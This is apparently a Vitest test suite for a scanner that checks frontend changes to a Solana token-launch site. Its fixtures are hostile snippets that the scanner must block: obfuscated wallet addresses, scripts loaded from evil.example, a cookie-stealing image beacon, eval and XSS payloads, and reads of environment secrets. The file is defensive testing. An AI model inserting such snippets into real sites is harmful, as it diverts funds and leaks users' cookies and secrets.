import { describe, expect, it } from 'vitest';

import { base58Decode, base58Encode } from './base58.js';
import {
  ADDR,
  ADDR2,
  ADDR_BYTES,
  PNG,
  added,
  modified,
  rulesOf,
  scan,
  scanComponent,
} from './test-helpers.js';

const RELAY = { rpcRelayHost: 'app.forge.example', r2PublicHost: 'media.forge.example' };

describe('base58 helpers', () => {
  it('round-trips and encodes known values', () => {
    expect(base58Encode(new Uint8Array(32))).toBe('11111111111111111111111111111111');
    expect(base58Encode(base58Decode(ADDR))).toBe(ADDR);
    expect(base58Decode(ADDR).length).toBe(32);
  });
});

describe('Solana addresses (diff-aware)', () => {
  it('blocks a new address in code, JSON, Markdown and CSS', () => {
    expect(scanComponent(`export const TREASURY = '${ADDR}';`)).toContain('solana-address');
    expect(
      rulesOf(scan([added('src/content/home.json', JSON.stringify({ donate: ADDR }))])),
    ).toContain('solana-address');
    expect(rulesOf(scan([added('src/content/about.md', `Send SOL to ${ADDR}`)]))).toContain(
      'solana-address',
    );
    expect(
      rulesOf(scan([added('src/theme/x.css', `.cta::after { content: "${ADDR}"; }`)])),
    ).toContain('solana-address');
  });

  it('ignores an address already present in the baseline file', () => {
    const before = `export const MINT = '${ADDR}';\nexport const A = 1;\n`;
    const after = `export const A = 2;\nexport const MINT = '${ADDR}';\n`;
    expect(scan([modified('src/components/x.ts', before, after)])).toEqual({ ok: true });
  });

  it('blocks a second copy of a baseline address', () => {
    const before = `export const MINT = '${ADDR}';\n`;
    const after = `export const MINT = '${ADDR}';\nexport const PAY_TO = '${ADDR}';\n`;
    const r = scan([modified('src/components/x.ts', before, after)]);
    expect(rulesOf(r)).toContain('solana-address');
    expect(r.ok ? null : r.violations[0]?.line).toBe(2);
  });

  it('honors the exact-value allowlist (empty by default)', () => {
    expect(scanComponent(`export const MINT = '${ADDR}';`, { addressAllowlist: [ADDR] })).toEqual(
      [],
    );
    expect(
      scanComponent(`export const MINT = '${ADDR}';`, { addressAllowlist: [ADDR.slice(1)] }),
    ).toContain('solana-address');
  });

  it('does not flag long camelCase identifiers or normal prose', () => {
    const src = `
      export function PreviewHeroSectionBackgroundGradientWrapper() {
        return <p>Launch your own coin today and trade it on the bonding curve right away.</p>;
      }`;
    expect(scanComponent(src)).toEqual([]);
  });

  describe('obfuscation', () => {
    const cases: Record<string, string> = {
      'split string concatenation': `const a = '${ADDR.slice(0, 10)}' + '${ADDR.slice(10, 25)}' + '${ADDR.slice(25)}';`,
      'template literal parts': `const p = '${ADDR.slice(0, 20)}'; export const a = \`\${p}${ADDR.slice(20)}\`;`,
      'array join': `export const a = [${Array.from(ADDR.match(/.{1,6}/g) ?? [], (s) => `'${s}'`).join(', ')}].join('');`,
      'unicode escapes': `export const a = '${Array.from(ADDR, (c) => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`).join('')}';`,
      'hex escapes': `export const a = '${Array.from(ADDR, (c) => `\\x${c.charCodeAt(0).toString(16)}`).join('')}';`,
      'base64 of the address text': `export const a = atob('${Buffer.from(ADDR).toString('base64')}');`,
      'base64 literal without decoding call': `export const blob = '${Buffer.from(ADDR).toString('base64')}';`,
      'base64 of the raw 32 bytes': `export const k = '${Buffer.from(ADDR_BYTES).toString('base64')}';`,
      'hex of the raw 32 bytes': `export const k = '${Buffer.from(ADDR_BYTES).toString('hex')}';`,
      'byte array': `export const k = new Uint8Array([${Array.from(ADDR_BYTES).join(', ')}]);`,
      'String.fromCharCode': `export const a = String.fromCharCode(${Array.from(ADDR, (c) => c.charCodeAt(0)).join(', ')});`,
      'reversed string': `export const a = '${[...ADDR].reverse().join('')}'.split('').reverse().join('');`,
      'separator removed': `export const a = '${ADDR.match(/.{1,8}/g)?.join('-')}'.replace(/-/g, '');`,
      'let with +=': `let a = '${ADDR.slice(0, 22)}';\na += '${ADDR.slice(22)}';\nexport { a };`,
      'Buffer.from base64': `export const a = Buffer.from('${Buffer.from(ADDR).toString('base64')}', 'base64').toString();`,
      'JSX split across elements': `export const C = () => <p><span>${ADDR.slice(0, 22)}</span><span>${ADDR.slice(22)}</span></p>;`,
      'JSX entities': `export const C = () => <p>${ADDR.slice(0, 5)}&#${ADDR.charCodeAt(5)};${ADDR.slice(6)}</p>;`,
      'zero-width chars in JSX text': `export const C = () => <p>${ADDR.slice(0, 20)}\u200b${ADDR.slice(20)}</p>;`,
      'object constant': `const o = { a: '${ADDR.slice(0, 20)}', b: '${ADDR.slice(20)}' }; export const x = o.a + o['b'];`,
    };
    for (const [name, src] of Object.entries(cases)) {
      it(`detects ${name}`, () => {
        const r = scanComponent(src);
        expect(r.some((x) => x === 'solana-address' || x === 'solana-address-encoded')).toBe(true);
      });
    }

    it('detects a generated (non-USDC) address too', () => {
      expect(scanComponent(`export const a = '${ADDR2}';`)).toContain('solana-address');
    });
  });
});

describe('external scripts', () => {
  it('blocks external <script src> and next/script', () => {
    expect(
      scanComponent(`export const C = () => <script src="https://evil.example/x.js" />;`),
    ).toContain('external-script');
    expect(
      scanComponent(
        `import Script from 'next/script';\nexport const C = () => <Script src="https://cdn.evil.example/a.js" />;`,
      ),
    ).toContain('external-script');
    expect(
      scanComponent(
        `import S from 'next/script';\nexport const C = () => <S src={'https://ev' + 'il.example/a.js'} />;`,
      ),
    ).toContain('external-script');
    expect(
      scanComponent(`export const C = ({ u }: { u: string }) => <script src={u} />;`),
    ).toContain('external-script');
  });

  it('blocks inline scripts and scripts created from code', () => {
    expect(scanComponent(`export const C = () => <script>{'alert(1)'}</script>;`)).toContain(
      'inline-script',
    );
    expect(
      scanComponent(
        `const s = document.createElement('scr' + 'ipt'); s.src = 'https://evil.example/x.js'; document.body.appendChild(s);`,
      ),
    ).toContain('inline-script');
    expect(
      scanComponent(
        `const T = 'script'; export const C = () => <T src="https://evil.example/x.js" />;`,
      ),
    ).toContain('external-script');
  });

  it('allows an allowlisted script host', () => {
    expect(
      scanComponent(
        `import Script from 'next/script';\nexport const C = () => <Script src="https://plugin.jup.ag/plugin-v1.js" />;`,
      ),
    ).toEqual([]);
  });
});

describe('network sinks', () => {
  const blocked: Record<string, string> = {
    'fetch to an unknown domain': `fetch('https://evil.example/collect');`,
    'look-alike subdomain': `fetch('https://jup.ag.evil.example/x');`,
    'credentials trick': `fetch('https://jup.ag@evil.example/x');`,
    'protocol-relative': `fetch('//evil.example/x');`,
    'backslash protocol-relative': `fetch('/\\\\evil.example/x');`,
    'split domain': `fetch('https://ev' + 'il.example/x');`,
    'template domain': `const h = 'evil.example'; fetch(\`https://\${h}/x\`);`,
    'dynamic host': `export function f(h: string) { return fetch(\`https://\${h}/x\`); }`,
    'dynamic URL': `export function f(u: string) { return fetch(u); }`,
    'host not terminated': `export function f(p: string) { return fetch('https://datapi.jup.ag' + p); }`,
    'tab inside scheme': `fetch('ht\\ttps://evil.example/');`,
    'computed window.fetch': `window['fe' + 'tch']('https://evil.example/');`,
    'aliased fetch': `const f = fetch; f('/api');`,
    'fetch.call': `fetch.call(null, 'https://evil.example');`,
    'tagged template fetch': 'fetch`https://evil.example`;',
    WebSocket: `new WebSocket('wss://evil.example/ws');`,
    EventSource: `new EventSource('https://evil.example/s');`,
    XMLHttpRequest: `const x = new XMLHttpRequest(); x.open('GET', '/x');`,
    sendBeacon: `navigator.sendBeacon('https://evil.example', 'data');`,
    'dynamic import of URL': `import('https://evil.example/mod.js');`,
    'static import of URL': `import x from 'https://evil.example/mod.js'; export default x;`,
    'dynamic import specifier': `export const load = (m: string) => import(m);`,
    'new URL to unknown host': `export const u = new URL('https://evil.example/x');`,
    'service worker': `navigator.serviceWorker.register('/sw.js');`,
    'insecure allowlisted host': `fetch('http://datapi.jup.ag/v1');`,
    'conditional with one bad branch': `export const f = (a: boolean) => fetch(a ? 'https://datapi.jup.ag/x' : 'https://evil.example/x');`,
    'http client package': `import axios from 'axios'; axios.get('https://evil.example');`,
    'RPC relay without configuration': `fetch('https://app.forge.example/api/rpc');`,
    'R2 wildcard not allowed': `fetch('https://pub-123.r2.dev/x.png');`,
    'img element src assignment': `const i = new Image(); i.src = 'https://evil.example/p?c=' + document.cookie;`,
  };
  for (const [name, src] of Object.entries(blocked)) {
    it(`blocks ${name}`, () => {
      const r = scanComponent(src);
      expect(r.length, `${name}: ${src}`).toBeGreaterThan(0);
      expect(
        r.some((x) =>
          [
            'network-domain',
            'network-dynamic-url',
            'network-api-forbidden',
            'forbidden-import',
            'embed-external',
          ].includes(x),
        ),
      ).toBe(true);
    });
  }

  const allowed: Record<string, string> = {
    'Jupiter data API': `fetch('https://datapi.jup.ag/v1/pools/toptraded/24h');`,
    'Jupiter API with dynamic path': `export const f = (id: string) => fetch(\`https://datapi.jup.ag/v1/pools?assetIds=\${id}\`);`,
    'same-origin relative URL': `fetch('/api/upload', { method: 'POST' });`,
    'same-origin dynamic path': `export const f = (id: string) => fetch(\`/api/coins/\${id}\`);`,
    'const base URL': `const API = 'https://datapi.jup.ag/v1'; export const f = (p: string) => fetch(\`\${API}/\${p}\`);`,
    'Jupiter trench stream': `new WebSocket('wss://trench-stream.jup.ag/ws');`,
    'new URL on own origin': `export const u = () => new URL('/coin', window.location.origin);`,
    'window.fetch': `window.fetch('/api/x');`,
  };
  for (const [name, src] of Object.entries(allowed)) {
    it(`allows ${name}`, () => {
      expect(scanComponent(src)).toEqual([]);
    });
  }

  it('allows the configured RPC relay and R2 hosts', () => {
    expect(
      scanComponent(
        `fetch('https://app.forge.example/api/rpc'); fetch('https://media.forge.example/a.png');`,
        RELAY,
      ),
    ).toEqual([]);
  });
});

describe('wallet and signing APIs', () => {
  const blocked: Record<string, string> = {
    signTransaction: `export const f = async (w: any, tx: any) => w.signTransaction(tx);`,
    signAllTransactions: `export const f = async (w: any, txs: any) => w.signAllTransactions(txs);`,
    'destructured sendTransaction': `export function useX(useW: any) { const { sendTransaction } = useW(); return sendTransaction; }`,
    approve: `export const f = (t: any) => t.approve(1);`,
    createApproveInstruction: `export const f = (spl: any) => spl.createApproveInstruction();`,
    createSetAuthorityInstruction: `export const f = (spl: any) => spl.createSetAuthorityInstruction();`,
    setAuthority: `export const f = (spl: any) => spl.setAuthority();`,
    Keypair: `export const f = (w3: any) => w3.Keypair.generate();`,
    'computed key': `export const f = (w: any, tx: any) => w['sign' + 'Transaction'](tx);`,
    'string name in a constant': `const M = 'signAllTransactions'; export const f = (w: any) => w[M]();`,
    'injected provider': `export const f = () => (window as any).solana.connect();`,
    'web3 import': `import { PublicKey } from '@solana/web3.js'; export const k = PublicKey;`,
    'wallet adapter import': `import { useWallet } from '@solana/wallet-adapter-react'; export const u = useWallet;`,
    'forge core import': `import * as core from '@forge/core'; export const c = core;`,
    'system transfer': `export const f = (w3: any) => w3.SystemProgram.transfer({});`,
  };
  for (const [name, src] of Object.entries(blocked)) {
    it(`blocks ${name}`, () => {
      const r = scanComponent(src);
      expect(r.some((x) => x === 'wallet-api' || x === 'forbidden-import')).toBe(true);
    });
  }

  it('allows wallet-looking design names', () => {
    const src = `
      import { TradePanel } from '@/forge/TradePanel';
      export function Hero({ onApproveClick }: { onApproveClick: () => void }) {
        return <section><button onClick={onApproveClick}>Approve</button><TradePanel /></section>;
      }`;
    expect(scanComponent(src)).toEqual([]);
  });
});

describe('dynamic code', () => {
  const blocked: Record<string, string> = {
    eval: `eval('1 + 1');`,
    'escaped eval identifier': `\\u0065val('1');`,
    'indirect eval': `(0, eval)('1');`,
    'window eval computed': `window['ev' + 'al']('1');`,
    'new Function': `new Function('return 1')();`,
    'Function call': `Function('return 1')();`,
    'constructor chain': `[].constructor.constructor('return 1')();`,
    'setTimeout string': `setTimeout('alert(1)', 10);`,
    'setInterval template': 'setInterval(`alert(${1})`, 10);',
    'setTimeout folded string': `const code = 'alert(1)'; setTimeout(code, 1);`,
    'window.setTimeout string': `window.setTimeout('x()', 1);`,
  };
  for (const [name, src] of Object.entries(blocked)) {
    it(`blocks ${name}`, () => {
      expect(scanComponent(src)).toContain('dynamic-code');
    });
  }

  it('allows timers with functions and Function as a type', () => {
    const src = `
      import { useEffect, useState } from 'react';
      type Handler = Function;
      export function Toast({ cb }: { cb: Handler }) {
        const [open, setOpen] = useState(true);
        useEffect(() => { const t = setTimeout(() => setOpen(false), 3000); const i = setInterval(tick, 1000); return () => { clearTimeout(t); clearInterval(i); }; }, []);
        function tick() {}
        return open ? <div onClick={() => cb()}>Saved</div> : null;
      }`;
    expect(scanComponent(src)).toEqual([]);
  });
});

describe('HTML sinks and javascript: URLs', () => {
  it('blocks dynamic dangerouslySetInnerHTML, innerHTML and document.write', () => {
    expect(
      scanComponent(
        `export const C = ({ html }: { html: string }) => <div dangerouslySetInnerHTML={{ __html: html }} />;`,
      ),
    ).toContain('dangerous-html');
    expect(
      scanComponent(
        `export const C = () => <div dangerouslySetInnerHTML={{ __html: '<img src=x onerror="alert(1)">' }} />;`,
      ),
    ).toContain('dangerous-html');
    expect(
      scanComponent(
        `import { createElement } from 'react'; export const C = (h: string) => createElement('div', { dangerouslySetInnerHTML: { __html: h } });`,
      ),
    ).toContain('dangerous-html');
    expect(
      scanComponent(`export const f = (el: HTMLElement, s: string) => { el.innerHTML = s; };`),
    ).toContain('dangerous-html');
    expect(scanComponent(`document.write('<p>x</p>');`)).toContain('dangerous-html');
    expect(scanComponent(`document['wri' + 'te']('<p>x</p>');`)).toContain('dangerous-html');
    expect(
      scanComponent(`export const C = () => <iframe srcDoc="<script>alert(1)</script>" />;`),
    ).toContain('dangerous-html');
  });

  it('allows a static, inert dangerouslySetInnerHTML', () => {
    expect(
      scanComponent(
        `export const C = () => <p dangerouslySetInnerHTML={{ __html: 'Fast &amp; <b>fair</b> launches' }} />;`,
      ),
    ).toEqual([]);
  });

  it('blocks javascript: URLs, including encoded ones', () => {
    expect(scanComponent(`export const C = () => <a href="javascript:alert(1)">x</a>;`)).toContain(
      'javascript-url',
    );
    expect(
      scanComponent(`export const C = () => <a href="&#106;avascript:alert(1)">x</a>;`),
    ).toContain('javascript-url');
    expect(
      scanComponent(`export const C = () => <a href={'java' + 'script:alert(1)'}>x</a>;`),
    ).toContain('javascript-url');
    expect(
      scanComponent(`export const C = () => <a href={'\\u006aavascript:void(0)'}>x</a>;`),
    ).toContain('javascript-url');
    expect(rulesOf(scan([added('src/content/x.md', '[Claim](javascript:alert(1))')]))).toContain(
      'javascript-url',
    );
  });

  it('allows external social links', () => {
    expect(
      scanComponent(
        `export const C = () => <a href="https://x.com/moonpad" target="_blank" rel="noreferrer">X</a>;`,
      ),
    ).toEqual([]);
  });
});

describe('navigation and server-side code', () => {
  it('blocks redirects to external sites', () => {
    expect(scanComponent(`window.location.href = 'https://evil.example';`)).toContain(
      'navigation-external',
    );
    expect(scanComponent(`location.assign('https://evil.example');`)).toContain(
      'navigation-external',
    );
    expect(scanComponent(`window.location = 'https://evil.example' as any;`)).toContain(
      'navigation-external',
    );
    expect(scanComponent(`window.open('https://evil.example');`)).toContain('navigation-external');
    expect(
      scanComponent(`export const f = (router: any) => router.push('https://evil.example/claim');`),
    ).toContain('navigation-external');
    expect(
      scanComponent(
        `export const getServerSideProps = () => ({ redirect: { destination: 'https://evil.example', permanent: false } });`,
        undefined,
        'src/pages/index.tsx',
      ),
    ).toContain('navigation-external');
    expect(
      scanComponent(
        `export const C = () => <meta httpEquiv="refresh" content="0;url=https://evil.example" />;`,
      ),
    ).toContain('navigation-external');
    expect(scanComponent(`export const go = (u: string) => { location.href = u; };`)).toContain(
      'navigation-external',
    );
    expect(scanComponent(`const l = window.location; l.href = 'https://evil.example';`)).toContain(
      'global-access',
    );
  });

  it('allows internal navigation and share links', () => {
    expect(
      scanComponent(
        `export const f = (router: any, mint: string) => router.push(\`/coin/\${mint}\`);`,
      ),
    ).toEqual([]);
    expect(scanComponent(`window.open('https://x.com/intent/tweet?text=gm', '_blank');`)).toEqual(
      [],
    );
    expect(scanComponent(`export const p = () => window.location.pathname;`)).toEqual([]);
  });

  it('blocks server secrets and Node built-ins', () => {
    expect(scanComponent(`export const k = process.env.R2_SECRET_ACCESS_KEY;`)).toContain(
      'server-secret',
    );
    expect(scanComponent(`export const e = process.env;`)).toContain('server-secret');
    expect(scanComponent(`export const e = process['en' + 'v'];`)).toContain('server-secret');
    expect(scanComponent(`import fs from 'fs'; export const x = fs;`)).toContain(
      'forbidden-import',
    );
    expect(
      scanComponent(`import { exec } from 'node:child_process'; export const x = exec;`),
    ).toContain('forbidden-import');
    expect(scanComponent(`export const x = require('child' + '_process');`)).toContain(
      'forbidden-import',
    );
  });

  it('allows public env variables', () => {
    expect(
      scanComponent(
        `export const n = process.env.NEXT_PUBLIC_SITE_NAME ?? 'MoonPad'; export const d = process.env.NODE_ENV === 'development';`,
      ),
    ).toEqual([]);
  });

  it('blocks aliasing of global objects', () => {
    expect(scanComponent(`const w = window; export const x = w;`)).toContain('global-access');
    expect(scanComponent(`export const f = (k: string) => (window as any)[k];`)).toContain(
      'global-access',
    );
    expect(scanComponent(`export const f = () => Reflect.get(globalThis, 'x');`)).toContain(
      'global-access',
    );
  });
});

describe('other file types', () => {
  it('blocks active SVG and allows a clean one', () => {
    expect(
      rulesOf(
        scan([
          added(
            'public/logo.svg',
            '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
          ),
        ]),
      ),
    ).toContain('inline-script');
    expect(
      rulesOf(
        scan([
          added(
            'public/logo.svg',
            '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>',
          ),
        ]),
      ),
    ).toContain('html-active-content');
    expect(
      rulesOf(
        scan([
          added(
            'public/logo.svg',
            '<svg xmlns="http://www.w3.org/2000/svg"><use href="https://evil.example/s.svg#a"/></svg>',
          ),
        ]),
      ),
    ).not.toEqual([]);
    expect(
      scan([
        added(
          'public/logo.svg',
          '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><defs><linearGradient id="g"/></defs><rect fill="url(#g)" width="10" height="10"/></svg>',
        ),
      ]),
    ).toEqual({ ok: true });
  });

  it('blocks external CSS imports and allows local assets', () => {
    expect(
      rulesOf(scan([added('src/theme/x.css', "@import url('https://evil.example/x.css');")])),
    ).toContain('network-domain');
    expect(
      rulesOf(
        scan([added('src/theme/x.css', '.a { background: \\75 rl(https://evil.example/p.png); }')]),
      ),
    ).toContain('network-domain');
    expect(
      scan([
        added(
          'src/theme/x.css',
          ".a { background: url('/images/bg.png'); }\n@font-face { src: url(/fonts/brand.woff2); }",
        ),
      ]),
    ).toEqual({ ok: true });
  });

  it('blocks active HTML in Markdown', () => {
    expect(
      rulesOf(
        scan([
          added('src/content/about.md', '# Hi\n<script src="https://evil.example/x.js"></script>'),
        ]),
      ),
    ).toContain('inline-script');
    expect(
      rulesOf(
        scan([added('src/content/about.md', '<iframe src="https://evil.example"></iframe>')]),
      ),
    ).toContain('html-active-content');
  });

  it('blocks syntax errors and hidden Unicode', () => {
    expect(scanComponent('export const = ;')).toContain('parse-error');
    expect(
      scanComponent("export const isAdmin = 'user\u202E \u2066// admin\u2069 \u2066';"),
    ).toContain('hidden-unicode');
    expect(rulesOf(scan([added('src/content/x.json', '{ "a": ')]))).toContain('parse-error');
  });
});

describe('diff awareness', () => {
  it('does not block pre-existing template code that is only moved', () => {
    const before = `export const C = ({ html }: { html: string }) => <div dangerouslySetInnerHTML={{ __html: html }} />;\n`;
    const after = `// Styled by the agent\nexport const C = ({ html }: { html: string }) => <div className="prose" dangerouslySetInnerHTML={{ __html: html }} />;\n`;
    expect(scan([modified('src/components/Html.tsx', before, after)])).toEqual({ ok: true });
  });

  it('blocks a new instance of a pre-existing pattern', () => {
    const before = `export const f = (u: string) => fetch(u);\n`;
    const after = `export const f = (u: string) => fetch(u);\nexport const g = (u: string) => fetch(u);\n`;
    expect(rulesOf(scan([modified('src/components/api.ts', before, after)]))).toContain(
      'network-dynamic-url',
    );
  });

  it('blocks a baseline constant changed to an external URL', () => {
    const before = `const API = 'https://datapi.jup.ag/v1';\nexport const f = () => fetch(API + '/pools');\n`;
    const after = `const API = 'https://evil.example/v1';\nexport const f = () => fetch(API + '/pools');\n`;
    expect(rulesOf(scan([modified('src/components/api.ts', before, after)]))).toContain(
      'network-domain',
    );
  });
});

describe('realistic clean theme change', () => {
  it('passes', () => {
    const files = [
      modified(
        'src/theme/tokens.ts',
        "export const tokens = { primary: '#7C3AED', accent: '#F59E0B', radius: '12px' };\n",
        "export const tokens = { primary: '#10B981', accent: '#F43F5E', radius: '16px', font: \"'Space Grotesk', sans-serif\" };\n",
      ),
      modified(
        'src/theme/globals.css',
        ':root { --primary: #7c3aed; }\n',
        ":root { --primary: #10b981; --accent: #f43f5e; }\nbody { background: radial-gradient(circle at top, #111827, #030712); }\n.hero { background-image: url('/images/hero.webp'); }\n",
      ),
      added(
        'src/components/Hero.tsx',
        `import Image from 'next/image';
import Link from 'next/link';
import { useEffect, useState } from 'react';
import { TradePanel } from '@/forge/TradePanel';
import { tokens } from '@/theme/tokens';
import content from '@/content/home.json';

type Pool = { id: string; name: string };

export function Hero({ mint }: { mint: string }) {
  const [pools, setPools] = useState<Pool[]>([]);
  const [visible, setVisible] = useState(false);
  useEffect(() => {
    const t = setTimeout(() => setVisible(true), 150);
    fetch(\`https://datapi.jup.ag/v1/pools/toptraded/24h?limit=\${10}\`)
      .then((r) => r.json())
      .then((d: { pools: Pool[] }) => setPools(d.pools))
      .catch(() => setPools([]));
    return () => clearTimeout(t);
  }, []);
  return (
    <section className="hero flex flex-col items-center gap-6 px-4 py-16" style={{ color: tokens.primary }}>
      <Image src="/logo.png" alt="MoonPad" width={96} height={96} priority />
      <h1 className={visible ? 'opacity-100 transition-opacity' : 'opacity-0'}>{content.tagline}</h1>
      <p>{content.about}</p>
      <Link href={\`/coin/\${mint}\`} className="rounded-xl bg-[var(--primary)] px-6 py-3">Trade now</Link>
      <a href="https://x.com/moonpad" target="_blank" rel="noreferrer">Follow us on X</a>
      <ul>{pools.map((p) => <li key={p.id}>{p.name}</li>)}</ul>
      <TradePanel />
    </section>
  );
}
`,
      ),
      modified(
        'src/content/home.json',
        '{ "tagline": "To the moon", "about": "A launchpad." }\n',
        '{ "tagline": "Launch fair, trade fast", "about": "Community coins on a bonding curve." }\n',
      ),
      added(
        'src/content/faq.md',
        '# FAQ\n\n## What is the platform fee?\n\n0.3% on each trade, shown before you sign.\n',
      ),
      added(
        'public/images/hero.webp',
        Uint8Array.from([...Buffer.from('RIFF'), 0, 0, 0, 0, ...Buffer.from('WEBP'), 0x56, 0x50]),
      ),
      added('public/logo.png', PNG),
      added(
        'public/favicon.svg',
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><circle cx="16" cy="16" r="14" fill="#10B981"/></svg>',
      ),
    ];
    const r = scan(files, RELAY);
    expect(r).toEqual({ ok: true });
  });
});
